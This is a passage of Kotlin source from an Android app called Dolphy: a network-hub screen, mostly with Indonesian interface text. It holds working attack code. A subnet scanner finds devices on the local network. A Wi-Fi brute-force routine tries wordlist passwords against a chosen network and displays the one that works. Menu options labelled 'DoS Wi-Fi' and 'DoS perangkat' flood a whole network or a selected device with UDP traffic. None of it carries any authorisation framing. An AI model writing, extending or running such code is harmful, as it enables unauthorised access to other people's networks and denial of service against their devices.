            val subnet = self?.substringBeforeLast('.') ?: gateway?.substringBeforeLast('.')
            if (subnet != null) {
                coroutineScope {
                    val jobs = (1..254).map { i ->
                        async(Dispatchers.IO) {
                            val ip = "$subnet.$i"
                            if (hosts.containsKey(ip)) return@async null
                            val alive = runCatching {
                                val addr = InetAddress.getByName(ip)
                                addr.isReachable(180) || quickPortOpen(ip, 80, 60) || quickPortOpen(ip, 443, 60) ||
                                    quickPortOpen(ip, 53, 40) || quickPortOpen(ip, 22, 40) || quickPortOpen(ip, 445, 40)
                            }.getOrDefault(false)
                            if (!alive) return@async null
                            val name = runCatching {
                                val c = InetAddress.getByName(ip).canonicalHostName
                                if (c != null && c != ip) c else null
                            }.getOrNull()
                            HubLanHost(
                                ip = ip,
                                title = name ?: ip,
                                subtitle = if (name != null) ip else "online",
                            )
                        }
                    }
                    jobs.chunked(32).forEach { chunk ->
                        if (!isActive) return@coroutineScope
                        val found = chunk.awaitAll().filterNotNull()
                        if (found.isNotEmpty()) {
                            found.forEach { hosts[it.ip] = it }
                            withContext(Dispatchers.Main) {
                                lanHosts.clear()
                                lanHosts.addAll(
                                    hosts.values.sortedWith(
                                        compareByDescending<HubLanHost> { it.isGateway }
                                            .thenBy { it.isSelf }
                                            .thenBy { it.ip.substringAfterLast('.').toIntOrNull() ?: 0 },
                                    ),
                                )
                            }
                        }
                    }
                }
            }
            readArpTable().forEach { (ip, mac) ->
                val old = hosts[ip]
                if (old != null && !old.subtitle.contains("MAC")) {
                    hosts[ip] = old.copy(subtitle = listOf(old.subtitle, "MAC $mac").filter { it.isNotBlank() }.joinToString(" · "))
                } else if (old == null) {
                    hosts[ip] = HubLanHost(ip, ip, "MAC $mac")
                }
            }
            withContext(Dispatchers.Main) {
                lanHosts.clear()
                lanHosts.addAll(
                    hosts.values
                        .filter { !it.isSelf }
                        .sortedWith(
                            compareByDescending<HubLanHost> { it.isGateway }
                                .thenBy { it.ip.substringAfterLast('.').toIntOrNull() ?: 0 },
                        ),
                )
                lanScanning = false
                appendLog("Perangkat ditemukan: ${lanHosts.size}")
            }
        }
    }

    fun startWifiBruteForce(network: HubWifiNetwork) {
        bruteForceJob?.cancel()
        sendLogs.clear()
        dialogStage = HubDialogStage.BruteForce
        bruteForceSuccess = false
        bruteForceNeedsUserAction = false
        foundPassword = ""
        currentBrutePassword = ""
        val selectedGroups = passwordGroups.filter { it.selected }
        val totalCandidates = selectedGroups.sumOf { it.validCount.toLong() }
        val targetSsid = network.ssid
        val security = detectWifiPersonalSecurity(network.capabilities)
        appendLog("Starting Brute Force: $targetSsid")
        appendLog("Groups: ${selectedGroups.joinToString { it.name }}")
        appendLog("Password candidates: $totalCandidates (unsupported WPA entries are skipped)")
        appendLog("Target: ${security.name} · BSSID ${network.bssid ?: "tersedia dari SSID"}")
        if (selectedGroups.isEmpty() || totalCandidates == 0L) {
            appendLog("Select a wordlist containing at least one valid WPA password.")
            return
        }
        if (security == WifiPersonalSecurity.UNSUPPORTED) {
            appendLog("This security mode is not a supported WPA2/WPA3 personal network.")
            return
        }
        if (security == WifiPersonalSecurity.WPA3 && Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            appendLog("WPA3-SAE testing requires Android 11 or newer.")
            return
        }

        bruteForceJob = scope.launch(Dispatchers.IO) {
            wifiBruteMutex.withLock {
            var attempted = 0L
            var rejected = 0L
            var unverified = 0L
            var found = false
            var failed = false
            var needsUserAction = false
            try {
                withContext(Dispatchers.Main) {
                    appendLog("Preparing radio and removing old Dolphy suggestions...")
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        appendLog("If Android asks to approve network suggestions, allow Dolphy.")
                    }
                }
                prepareRadioForBrute(wifiManager, targetSsid)

                val activeSsid = currentCompletedWifiSsid(wifiManager)
                if (activeSsid != null) {
                    needsUserAction = true
                    withContext(Dispatchers.Main) {
                        bruteForceNeedsUserAction = true
                        appendLog("Wi-Fi $activeSsid is still connected. Disconnect it in system Wi-Fi settings, then retry.")
                        appendLog("No password was tested; Android 10+ does not let this app disconnect saved Wi-Fi.")
                    }
                    return@launch
                }

                for (group in selectedGroups) {
                    if (!isActive || found || failed || needsUserAction) break
                    val cursor = group.openCursor(context)
                    try {
                        while (isActive && !found && !failed && !needsUserAction) {
                            val password = cursor.nextPassword() ?: break
                            if (!isSupportedWpaPassphrase(password)) continue
                            attempted++

                            withContext(Dispatchers.Main) {
                                currentBrutePassword = password
                                appendLog("[$attempted/$totalCandidates] Testing: $password")
                            }

                            val result = testWifiPassword(context, wifiManager, network, password)
                            if (!isActive) break

                            when (result.outcome) {
                                WifiAttemptOutcome.SUCCESS -> {
                                    found = true
                                    withContext(Dispatchers.Main) {
                                        currentBrutePassword = password
                                        appendLog("SUCCESS! Android confirmed this suggestion: $password")
                                        foundPassword = password
                                        bruteForceSuccess = true
                                        com.droid.dolphy.trackWifiBruteSuccess(context)
                                        haptics.performHapticFeedback(
                                            androidx.compose.ui.hapticfeedback.HapticFeedbackType.LongPress,
                                        )
                                    }
                                }

                                WifiAttemptOutcome.REJECTED -> {
                                    rejected++
                                    withContext(Dispatchers.Main) {
                                        appendLog("Rejected by authentication: $password")
                                    }
                                }

                                WifiAttemptOutcome.INCONCLUSIVE -> {
                                    unverified++
                                    withContext(Dispatchers.Main) {
                                        appendLog("Not verified: $password · ${result.detail}")
                                    }
                                    if (unverified >= 2) {
                                        needsUserAction = true
                                        withContext(Dispatchers.Main) {
                                            bruteForceNeedsUserAction = true
                                            appendLog("Paused instead of labeling unverified passwords as wrong.")
                                            appendLog("Disconnect other Wi-Fi, approve Dolphy suggestions, then retry.")
                                        }
                                    }
                                }

                                WifiAttemptOutcome.UNSUPPORTED,
                                WifiAttemptOutcome.ERROR,
                                -> {
                                    failed = true
                                    withContext(Dispatchers.Main) {
                                        appendLog("Cannot test $password: ${result.detail}")
                                    }
                                }
                            }
                            if (!found) settleAfterFailedAttempt(wifiManager, targetSsid)
                        }
                    } finally {
                        runCatching { cursor.close() }
                    }
                }
            } catch (e: CancellationException) {
                throw e
            } catch (e: Exception) {
                failed = true
                withContext(Dispatchers.Main) {
                    appendLog("Wordlist read/test error: ${e.message ?: e.javaClass.simpleName}")
                }
            }
            if (isActive) {
                withContext(Dispatchers.Main) {
                    when {
                        found -> appendLog("Scan finished with a confirmed password.")
                        needsUserAction -> appendLog("Scan paused; no unverified entry was marked as failed.")
                        failed -> appendLog("Scan stopped after an API or wordlist error.")
                        else -> appendLog("Scan finished. Rejected: $rejected · unverified: $unverified")
                    }
                }
            }
            }
        }
    }

    fun closeDialog() {
        udpSendJob?.cancel()
        bruteForceJob?.cancel()
        lanScanJob?.cancel()
        udpSendJob = null
        bruteForceJob = null
        lanScanJob = null
        dialogStage = null
        dialogNetwork = null
        countdown = 3
        launchedWifiSettings = false
        sendLogs.clear()
        bruteForceSuccess = false
        bruteForceNeedsUserAction = false
        foundPassword = ""
        selectedTargetLabel = ""
        lanHosts.clear()
        lanScanning = false
    }

    fun startActiveNetworkTest(network: HubWifiNetwork, targetIp: String? = null, label: String = "") {
        udpSendJob?.cancel()
        udpSendJob = null
        lanScanJob?.cancel()
        dialogNetwork = network
        selectedTargetLabel = label
        dialogStage = HubDialogStage.Started
        launchedWifiSettings = false
        sendLogs.clear()
        udpSendJob = startContinuousUdpTest(network.ssid, targetIp)
    }

    LaunchedEffect(wifiPermissionsGranted, locationServicesEnabled) {
        if (wifiPermissionsGranted && !locationServicesEnabled) {
            showLocationServicesDialog = true
        }
    }

    DisposableEffect(lifecycleOwner, wifiPermissionsGranted) {
        val observer = LifecycleEventObserver { _, event ->
            if (event == Lifecycle.Event.ON_RESUME) {
                wifiPermissionsGranted = hasWifiPermissions()
                locationServicesEnabled = isLocationServicesEnabled()
                showLocationServicesDialog = wifiPermissionsGranted && !locationServicesEnabled
                refreshNetworks()

                val target = dialogNetwork
                if (launchedWifiSettings && dialogStage == HubDialogStage.WaitingConnection && target != null) {
                    val connected = currentSsid() == target.ssid
                    launchedWifiSettings = false
                    if (connected) {
                        dialogStage = HubDialogStage.Started
                        sendLogs.clear()
                        udpSendJob?.cancel()
                        udpSendJob = null
                        udpSendJob = startContinuousUdpTest(target.ssid)
                    } else {
                        dialogStage = HubDialogStage.Error
                    }
                }
            }
        }
        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose { lifecycleOwner.lifecycle.removeObserver(observer) }
    }

    DisposableEffect(wifiPermissionsGranted, locationServicesEnabled, wifiManager) {
        refreshNetworks()
        val job = scope.launch {
            while (isActive) {
                if (wifiPermissionsGranted && locationServicesEnabled) refreshNetworks()
                delay(2500)
            }
        }
        onDispose { job.cancel() }
    }

    LaunchedEffect(dialogStage, countdown, dialogNetwork?.ssid) {
        if (dialogStage == HubDialogStage.Countdown && dialogNetwork != null) {
            if (countdown > 1) {
                delay(1000)
                countdown -= 1
            } else {
                delay(1000)
                dialogStage = HubDialogStage.WaitingConnection
                launchedWifiSettings = true
                context.startActivity(Intent(Settings.ACTION_WIFI_SETTINGS))
            }
        }
    }

    Box(modifier = Modifier.fillMaxSize()) {
        MaterialBackground(accentColor = MaterialTheme.colorScheme.primary) {
            Column(
                modifier = Modifier
                    .fillMaxSize()
                    .statusBarsPadding()
                    .navigationBarsPadding()
                    .padding(horizontal = 16.dp, vertical = 12.dp),
                verticalArrangement = Arrangement.spacedBy(16.dp)
            ) {
                SectionTopBar(
                    title = stringResource(R.string.network_hub_title),
                    onBack = { navController.popBackStack() },
                    actions = {
                        DolphyIconButton(onClick = { showPasswordDialog = true }) {
                            Icon(Icons.Filled.VpnKey, contentDescription = stringResource(R.string.wifi_brute_force_passwords), tint = MaterialTheme.colorScheme.primary)
                        }
                    }
                )

                if (!wifiPermissionsGranted) {
                    Surface(
                        modifier = Modifier.fillMaxWidth(),
                        shape = RoundedCornerShape(24.dp),
                        color = MaterialTheme.colorScheme.errorContainer
                    ) {
                        Column(
                            modifier = Modifier.padding(18.dp),
                            verticalArrangement = Arrangement.spacedBy(10.dp)
                        ) {
                            Text(
                                text = stringResource(R.string.network_hub_need_location),
                                style = MaterialTheme.typography.bodyLarge,
                                color = MaterialTheme.colorScheme.onErrorContainer
                            )
                            com.droid.dolphy.AccentButton(onClick = {
                                wifiPermissionLauncher.launch(requiredWifiPermissions())
                            }) {
                                Text(stringResource(R.string.us_wifi_grant_location))
                            }
                        }
                    }
                } else if (!locationServicesEnabled) {
                    Surface(
                        modifier = Modifier.fillMaxWidth(),
                        shape = RoundedCornerShape(24.dp),
                        color = MaterialTheme.colorScheme.errorContainer
                    ) {
                        Column(
                            modifier = Modifier.padding(18.dp),
                            verticalArrangement = Arrangement.spacedBy(10.dp)
                        ) {
                            Text(
                                text = stringResource(R.string.us_wifi_need_location_services),
                                style = MaterialTheme.typography.bodyLarge,
                                color = MaterialTheme.colorScheme.onErrorContainer
                            )
                            com.droid.dolphy.AccentButton(onClick = {
                                showLocationServicesDialog = false
                                context.startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                            }) {
                                Text(stringResource(R.string.us_wifi_enable_location_services))
                            }
                        }
                    }
                }

                LazyColumn(
                    modifier = Modifier
                        .fillMaxSize()
                        .padding(horizontal = 16.dp),
                    verticalArrangement = Arrangement.spacedBy(M3SegmentedListItemSpacing),
                    contentPadding = PaddingValues(bottom = 20.dp, top = 8.dp),
                ) {
                    m3SegmentedItems(networks.toList()) { index, count, network ->
                        val active = network.isActive
                        val tint = if (active) MaterialTheme.colorScheme.primary else Color(0xFFD32F2F)
                        M3SegmentedListItem(
                            index = index,
                            count = count,
                            headline = network.ssid,
                            supporting = if (active) {
                                stringResource(R.string.network_hub_active_pinned)
                            } else {
                                "${network.frequencyMhz} MHz • ${network.level} dBm"
                            },
                            leadingIcon = Icons.Default.Wifi,
                            leadingIconTint = tint,
                            selected = active,
                            trailingContent = {
                                if (active) {
                                    Icon(
                                        Icons.Filled.CheckCircle,
                                        null,
                                        tint = MaterialTheme.colorScheme.primary,
                                        modifier = Modifier.size(20.dp),
                                    )
                                }
                            },
                            onClick = {
                                haptics.performHapticFeedback(
                                    androidx.compose.ui.hapticfeedback.HapticFeedbackType.LongPress,
                                )
                                if (!wifiPermissionsGranted) {
                                    wifiPermissionLauncher.launch(requiredWifiPermissions())
                                } else if (!locationServicesEnabled) {
                                    showLocationServicesDialog = true
                                } else {
                                    dialogNetwork = network
                                    dialogStage = HubDialogStage.Menu
                                }
                            },
                        )
                    }

                    item {
                        Spacer(modifier = Modifier.height(180.dp))
                    }
                }
            }
        }
    }

    if (showLocationServicesDialog) {
        com.droid.dolphy.ExpressiveDialog(
            onDismissRequest = { showLocationServicesDialog = false },
            title = { Text(stringResource(R.string.us_wifi_location_services_disabled_title)) },
            text = { Text(stringResource(R.string.us_wifi_location_services_disabled_message)) },
            confirmButton = {
                com.droid.dolphy.AccentButton(onClick = {
                    showLocationServicesDialog = false
                    context.startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                }) {
                    Text(stringResource(R.string.us_wifi_enable_location_services))
                }
            },
            dismissButton = {
                com.droid.dolphy.AccentButton(onClick = { showLocationServicesDialog = false }) {
                    Text(stringResource(R.string.cancel))
                }
            }
        )
    }

    val currentDialogNetwork = dialogNetwork
    val currentDialogStage = dialogStage
    if (currentDialogNetwork != null && currentDialogStage != null) {
        Dialog(
            onDismissRequest = { closeDialog() },
            properties = DialogProperties(dismissOnClickOutside = false)
        ) {
            Surface(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(28.dp),
                color = MaterialTheme.colorScheme.surfaceContainerHighest,
                tonalElevation = 8.dp
            ) {
                when (currentDialogStage) {
                    HubDialogStage.Menu -> {
                        Column(
                            modifier = Modifier.padding(24.dp),
                            horizontalAlignment = Alignment.CenterHorizontally,
                            verticalArrangement = Arrangement.spacedBy(16.dp)
                        ) {
                            Text(
                                text = currentDialogNetwork.ssid,
                                style = MaterialTheme.typography.headlineSmall,
                                fontWeight = FontWeight.Bold,
                                color = MaterialTheme.colorScheme.onSurface
                            )

                            MaterialCard(
                                modifier = Modifier.fillMaxWidth(),
                                accentColor = MaterialTheme.colorScheme.primary,
                                cornerRadius = 12.dp,
                                contentPadding = 0.dp
                            ) {
                                SignalRow(
                                    title = "DoS Wi-Fi",
                                    description = stringResource(R.string.wifi_stress_test),
                                    icon = Icons.Default.FlashOn,
                                    accentColor = MaterialTheme.colorScheme.primary,
                                    onClick = {
                                        if (currentDialogNetwork.isActive) {
                                            startActiveNetworkTest(currentDialogNetwork)
                                        } else {
                                            dialogStage = HubDialogStage.Countdown
                                            countdown = 3
                                            launchedWifiSettings = false
                                            sendLogs.clear()
                                        }
                                    }
                                )
                            }

                            MaterialCard(
                                modifier = Modifier.fillMaxWidth(),
                                accentColor = Color(0xFFFF6D00),
                                cornerRadius = 12.dp,
                                contentPadding = 0.dp
                            ) {
                                SignalRow(
                                    title = "DoS perangkat",
                                    description = "DoS perangkat tertentu di jaringan",
                                    icon = Icons.Default.WifiOff,
                                    accentColor = Color(0xFFFF6D00),
                                    onClick = {
                                        dialogStage = HubDialogStage.SelectDevice
                                        startLanDeviceScan()
                                    }
                                )
                            }

                            MaterialCard(
                                modifier = Modifier.fillMaxWidth(),
                                accentColor = Color(0xFFF44336),
                                cornerRadius = 12.dp,
                                contentPadding = 0.dp
                            ) {
                                SignalRow(
                                    title = "Brute Force Kata Sandi",
                                    description = stringResource(R.string.wifi_password_brute),
                                    icon = Icons.Default.SettingsEthernet,
                                    accentColor = Color(0xFFF44336),
                                    onClick = {
                                        startWifiBruteForce(currentDialogNetwork)
                                    }
                                )
                            }

                            MaterialCard(
                                modifier = Modifier.fillMaxWidth(),
                                accentColor = Color(0xFF4CAF50),
                                cornerRadius = 12.dp,
                                contentPadding = 0.dp
                            ) {
                                SignalRow(
                                    title = stringResource(R.string.network_hub_admin_panel),
                                    description = stringResource(R.string.network_hub_admin_panel_desc),
                                    icon = Icons.Default.Shield,
                                    accentColor = Color(0xFF4CAF50),
                                    onClick = {
                                        dialogStage = HubDialogStage.AdminPanel
                                    }
                                )
                            }

                            com.droid.dolphy.AccentButton(onClick = { closeDialog() }, modifier = Modifier.fillMaxWidth()) {
                                Text(stringResource(R.string.cancel))
                            }
                        }
                    }

                    HubDialogStage.SelectDevice -> {
                        Column(
                            modifier = Modifier
                                .padding(20.dp)
                                .fillMaxWidth()
                                .heightIn(min = 280.dp, max = 520.dp),
                            verticalArrangement = Arrangement.spacedBy(12.dp)
                        ) {
                            Text(
                                text = "DoS perangkat",
                                style = MaterialTheme.typography.headlineSmall,
                                fontWeight = FontWeight.Bold,
                            )
                            Text(
                                text = "Pilih perangkat di jaringan «${currentDialogNetwork.ssid}»",
                                style = MaterialTheme.typography.bodyMedium,
                                color = MaterialTheme.colorScheme.onSurfaceVariant,
                            )
                            if (lanScanning) {
                                Row(
                                    verticalAlignment = Alignment.CenterVertically,
                                    horizontalArrangement = Arrangement.spacedBy(10.dp),
                                ) {
                                    CircularProgressIndicator(modifier = Modifier.size(18.dp), strokeWidth = 2.dp)
                                    Text(
                                        "Memindai jaringan… ${lanHosts.size}",
                                        style = MaterialTheme.typography.labelLarge,
                                        color = MaterialTheme.colorScheme.primary,
                                    )
                                }
                            } else {
                                Text(
                                    "Ditemukan: ${lanHosts.size}",
                                    style = MaterialTheme.typography.labelLarge,
                                    color = MaterialTheme.colorScheme.onSurfaceVariant,
                                )
                            }
                            Surface(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .weight(1f, fill = true)
                                    .heightIn(min = 160.dp, max = 340.dp),
                                shape = RoundedCornerShape(16.dp),
                                color = MaterialTheme.colorScheme.surfaceContainerHigh,
                            ) {
                                if (lanHosts.isEmpty() && !lanScanning) {
                                    Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                                        Text(
                                            "Perangkat tidak ditemukan.\nHubungkan ke jaringan Wi-Fi ini.",
                                            textAlign = TextAlign.Center,
                                            color = MaterialTheme.colorScheme.onSurfaceVariant,
                                        )
                                    }
                                } else {
                                    LazyColumn(
                                        modifier = Modifier.fillMaxSize(),
                                        contentPadding = PaddingValues(8.dp),
                                        verticalArrangement = Arrangement.spacedBy(6.dp),
                                    ) {
                                        items(lanHosts.size) { index ->
                                            val host = lanHosts[index]
                                            Surface(
                                                onClick = {
                                                    startActiveNetworkTest(
                                                        currentDialogNetwork,
                                                        host.ip,
                                                        label = "${host.title} (${host.ip})",
                                                    )
                                                },
                                                shape = RoundedCornerShape(12.dp),
                                                color = if (host.isGateway) {
                                                    MaterialTheme.colorScheme.primaryContainer
                                                } else {
                                                    MaterialTheme.colorScheme.surface
                                                },
                                                modifier = Modifier.fillMaxWidth(),
                                            ) {
                                                Row(
                                                    Modifier
                                                        .fillMaxWidth()
                                                        .padding(horizontal = 14.dp, vertical = 12.dp),
                                                    verticalAlignment = Alignment.CenterVertically,
                                                    horizontalArrangement = Arrangement.SpaceBetween,
                                                ) {
                                                    Column(Modifier.weight(1f)) {
                                                        Text(
                                                            host.title,
                                                            style = MaterialTheme.typography.titleSmall,
                                                            fontWeight = FontWeight.SemiBold,
                                                        )
                                                        Text(
                                                            buildString {
                                                                append(host.ip)
                                                                if (host.subtitle.isNotBlank() && host.subtitle != host.ip) {
                                                                    append(" · ")
                                                                    append(host.subtitle)
                                                                }
                                                            },
                                                            style = MaterialTheme.typography.bodySmall,
                                                            color = MaterialTheme.colorScheme.onSurfaceVariant,
                                                        )
                                                    }
                                                    Icon(
                                                        Icons.Default.FlashOn,
                                                        contentDescription = null,
                                                        tint = if (host.isGateway) {
                                                            MaterialTheme.colorScheme.primary
                                                        } else {
                                                            Color(0xFFFF6D00)
                                                        },
                                                    )
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            Row(
                                Modifier.fillMaxWidth(),
                                horizontalArrangement = Arrangement.spacedBy(8.dp),
                            ) {
                                com.droid.dolphy.AccentButton(
                                    onClick = { dialogStage = HubDialogStage.Menu; lanScanJob?.cancel() },
                                    modifier = Modifier.weight(1f),
                                ) {
                                    Text(stringResource(R.string.cancel))
                                }
                                com.droid.dolphy.AccentButton(
                                    onClick = { startLanDeviceScan() },
                                    enabled = !lanScanning,
                                    modifier = Modifier.weight(1f),
                                ) {
                                    Text("Perbarui")
                                }
                            }
                        }
                    }

                    HubDialogStage.Countdown -> {
                        Column(
                            modifier = Modifier.padding(24.dp),
                            horizontalAlignment = Alignment.CenterHorizontally,
                            verticalArrangement = Arrangement.spacedBy(16.dp)
                        ) {
                            Text(
                                text = stringResource(R.string.network_hub_select_network, currentDialogNetwork.ssid),
                                style = MaterialTheme.typography.titleLarge,
                                fontWeight = FontWeight.Bold,
                            )
                            Text(
                                text = countdown.toString(),
                                style = MaterialTheme.typography.displayLarge,
                                color = MaterialTheme.colorScheme.primary,
                                fontWeight = FontWeight.ExtraBold,
                            )
                            com.droid.dolphy.AccentButton(
                                onClick = { closeDialog() },
                                modifier = Modifier.fillMaxWidth()
                            ) {
                                Text(stringResource(R.string.cancel))
                            }
                        }
                    }

                    HubDialogStage.WaitingConnection -> {
                        Column(
                            modifier = Modifier.padding(24.dp),
                            horizontalAlignment = Alignment.CenterHorizontally,
                            verticalArrangement = Arrangement.spacedBy(16.dp)
                        ) {
                            CircularProgressIndicator()
                            Text(
                                text = stringResource(R.string.network_hub_waiting_title),
                                style = MaterialTheme.typography.headlineSmall,
                                fontWeight = FontWeight.Bold,
                            )
                            Text(
                                text = stringResource(R.string.network_hub_waiting_message, currentDialogNetwork.ssid),
                                style = MaterialTheme.typography.bodyLarge,
                                color = MaterialTheme.colorScheme.onSurfaceVariant,
                            )
                            com.droid.dolphy.AccentButton(
                                onClick = { closeDialog() },
                                modifier = Modifier.fillMaxWidth()
                            ) {
                                Text(stringResource(R.string.cancel))
                            }
                        }
                    }

                    HubDialogStage.Started, HubDialogStage.BruteForce -> {
                        Column(
                            modifier = Modifier.padding(24.dp),
                            verticalArrangement = Arrangement.spacedBy(16.dp)
                        ) {
                            Text(
                                text = if (currentDialogStage == HubDialogStage.Started)
                                    stringResource(R.string.network_hub_started_title)
                                    else stringResource(R.string.wifi_brute_force_active),
                                style = MaterialTheme.typography.headlineSmall,
                                fontWeight = FontWeight.Bold,
                            )

                            if (currentDialogStage == HubDialogStage.BruteForce) {
                                Text(
                                    text = stringResource(R.string.wifi_testing, currentBrutePassword),
                                    style = MaterialTheme.typography.titleMedium,
                                    color = MaterialTheme.colorScheme.primary,
                                    fontWeight = FontWeight.Bold
                                )
                                LinearProgressIndicator(
                                    modifier = Modifier.fillMaxWidth().height(4.dp).clip(RoundedCornerShape(2.dp)),
                                    color = MaterialTheme.colorScheme.primary
                                )
                            }

                            if (currentDialogStage == HubDialogStage.BruteForce && bruteForceSuccess) {
                                Column(
                                    modifier = Modifier.fillMaxWidth().padding(vertical = 8.dp),
                                    horizontalAlignment = Alignment.CenterHorizontally,
                                    verticalArrangement = Arrangement.spacedBy(16.dp)
                                ) {
                                    Icon(
                                        Icons.Filled.CheckCircle,
                                        null,
                                        tint = Color.Green,
                                        modifier = Modifier.size(64.dp)
                                    )
                                    Text(
                                        text = stringResource(R.string.wifi_bruteforce_successful),
                                        style = MaterialTheme.typography.headlineSmall,
                                        color = Color.Green,
                                        fontWeight = FontWeight.Bold
                                    )
                                    Surface(
                                        color = Color.Black.copy(alpha = 0.8f),
                                        shape = RoundedCornerShape(12.dp),
                                        modifier = Modifier.fillMaxWidth()
                                    ) {
                                        Column(
                                            modifier = Modifier.padding(16.dp),
                                            horizontalAlignment = Alignment.CenterHorizontally
                                        ) {
                                        Text(
                                            text = stringResource(R.string.wifi_password_label),
                                                style = MaterialTheme.typography.labelMedium,
                                                color = Color.White.copy(alpha = 0.6f)
                                            )
                                            Text(
                                                text = foundPassword,
                                                style = MaterialTheme.typography.headlineMedium,
                                                fontWeight = FontWeight.ExtraBold,
                                                color = Color.Green,
                                                textAlign = TextAlign.Center
                                            )
                                        }
                                    }
                                }
                            } else {
                                Text(
                                    text = stringResource(R.string.network_hub_logs_title),
                                    style = MaterialTheme.typography.titleMedium,
                                    color = MaterialTheme.colorScheme.onSurfaceVariant,
                                )
                                if (sendLogs.isEmpty()) {
                                    Text(
                                        text = stringResource(R.string.network_hub_log_prepare),
                                        style = MaterialTheme.typography.bodyMedium,
                                        color = MaterialTheme.colorScheme.onSurfaceVariant,
                                    )
                                } else {
                                    Surface(
                                        modifier = Modifier
                                            .fillMaxWidth()
                                            .height(200.dp),
                                        shape = RoundedCornerShape(12.dp),
                                        color = Color.Black.copy(alpha = 0.8f)
                                    ) {
                                        LazyColumn(
                                            modifier = Modifier
                                                .fillMaxSize()
                                                .padding(12.dp),
                                            contentPadding = PaddingValues(4.dp),
                                            reverseLayout = true
                                        ) {
                                            items(sendLogs.size) { index ->
                                                Text(
                                                    text = sendLogs[sendLogs.size - 1 - index],
                                                    style = MaterialTheme.typography.bodyMedium,
                                                    color = if (currentDialogStage == HubDialogStage.BruteForce) Color.Green else Color(0xFFFF1744),
                                                    modifier = Modifier.padding(vertical = 2.dp)
                                                )
                                            }
                                        }
                                    }
                                }
                            }
                            if (currentDialogStage == HubDialogStage.BruteForce && bruteForceNeedsUserAction) {
                                Text(
                                    text = "Android belum memverifikasi kandidat. Putuskan Wi-Fi lain dan izinkan suggestion Dolphy; timeout bukan berarti kata sandi salah.",
                                    style = MaterialTheme.typography.bodySmall,
                                    color = MaterialTheme.colorScheme.onSurfaceVariant,
                                )
                                com.droid.dolphy.AccentButton(
                                    onClick = {
                                        runCatching {
                                            context.startActivity(Intent(Settings.ACTION_WIFI_SETTINGS))
                                        }
                                    },
                                    modifier = Modifier.fillMaxWidth(),
                                ) {
                                    Text("Buka Setelan Wi-Fi")
                                }
                                com.droid.dolphy.DolphyTextButton(
                                    onClick = { startWifiBruteForce(currentDialogNetwork) },
                                    modifier = Modifier.fillMaxWidth(),
                                ) {
                                    Text("Coba lagi dari awal")
                                }
                            }
                            com.droid.dolphy.AccentButton(
                                onClick = { closeDialog() },
                                modifier = Modifier.fillMaxWidth(),
                                colors = androidx.compose.material3.ButtonDefaults.filledTonalButtonColors(
                                    containerColor = MaterialTheme.colorScheme.primary,
                                    contentColor = MaterialTheme.colorScheme.onPrimary
                                )
                            ) {
                                Text(stringResource(R.string.cancel))
                            }
                        }
                    }

                    HubDialogStage.AdminPanel -> {
                        val gatewayIp = getGatewayIpAddress(context)
                        if (gatewayIp != null) {
                            Column(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .height(600.dp)
                                    .padding(0.dp)
                            ) {
                                Row(
                                    modifier = Modifier
                                        .fillMaxWidth()
                                        .padding(horizontal = 16.dp, vertical = 12.dp),
                                    verticalAlignment = Alignment.CenterVertically,
                                    horizontalArrangement = Arrangement.SpaceBetween
                                ) {
                                    Text(
                                        text = stringResource(R.string.network_hub_admin_panel),
                                        style = MaterialTheme.typography.titleLarge,
                                        fontWeight = FontWeight.Bold,
                                        color = MaterialTheme.colorScheme.onSurface
                                    )
                                    DolphyIconButton(onClick = { closeDialog() }) {
                                        Icon(Icons.Filled.Close, contentDescription = null, tint = MaterialTheme.colorScheme.onSurface)
                                    }
                                }
                                AndroidView(
                                    factory = { ctx ->
                                        WebView(ctx).apply {
                                            settings.javaScriptEnabled = true
                                            settings.loadWithOverviewMode = true
                                            settings.useWideViewPort = true
                                            settings.builtInZoomControls = true
                                            settings.displayZoomControls = false
                                            settings.domStorageEnabled = true
                                            webViewClient = WebViewClient()
                                            loadUrl("http://$gatewayIp")
                                        }
                                    },
                                    modifier = Modifier.fillMaxSize()
                                )
                            }
                        } else {
                            Column(
                                modifier = Modifier.padding(24.dp),
                                horizontalAlignment = Alignment.CenterHorizontally,
                                verticalArrangement = Arrangement.spacedBy(16.dp)
                            ) {
                                Icon(
                                    imageVector = Icons.Filled.WifiOff,
                                    contentDescription = null,
                                    tint = MaterialTheme.colorScheme.error,
                                    modifier = Modifier.size(48.dp)
                                )
                                Text(
                                    text = "Tidak ada koneksi Wi-Fi",
                                    style = MaterialTheme.typography.headlineSmall,
                                    fontWeight = FontWeight.Bold,
                                    color = MaterialTheme.colorScheme.error
                                )
                                Text(
                                    text = "Hubungkan ke jaringan Wi-Fi terlebih dahulu",
                                    style = MaterialTheme.typography.bodyLarge,
                                    color = MaterialTheme.colorScheme.onSurfaceVariant
                                )
                                com.droid.dolphy.AccentButton(
                                    onClick = { closeDialog() },
                                    modifier = Modifier.fillMaxWidth()
                                ) {
                                    Text(stringResource(R.string.cancel))
                                }
                            }
                        }
                    }

                    HubDialogStage.Error -> {
                        Column(
                            modifier = Modifier.padding(24.dp),
                            horizontalAlignment = Alignment.CenterHorizontally,
                            verticalArrangement = Arrangement.spacedBy(16.dp)
                        ) {
                            Icon(
                                imageVector = Icons.Filled.Close,
                                contentDescription = null,
                                tint = MaterialTheme.colorScheme.error,
                                modifier = Modifier.size(48.dp)
                            )
                            Text(
                                text = stringResource(R.string.network_hub_error_title),
                                style = MaterialTheme.typography.headlineSmall,
                                fontWeight = FontWeight.Bold,
                                color = MaterialTheme.colorScheme.error,
                            )
                            Text(
                                text = stringResource(R.string.network_hub_error_message),
                                style = MaterialTheme.typography.bodyLarge,
                                color = MaterialTheme.colorScheme.onSurfaceVariant,
                            )
                            com.droid.dolphy.AccentButton(
                                onClick = { closeDialog() },
                                modifier = Modifier.fillMaxWidth()
                            ) {
                                Text(stringResource(R.string.cancel))
                            }
                        }
                    }
                }
            }
        }
    }

    if (showPasswordDialog) {
        BrutePasswordDialog(
            passwordGroups = passwordGroups,
            isImporting = importingWordlist,
            isBusy = deletingWordlist,
            feedback = wordlistFeedback,
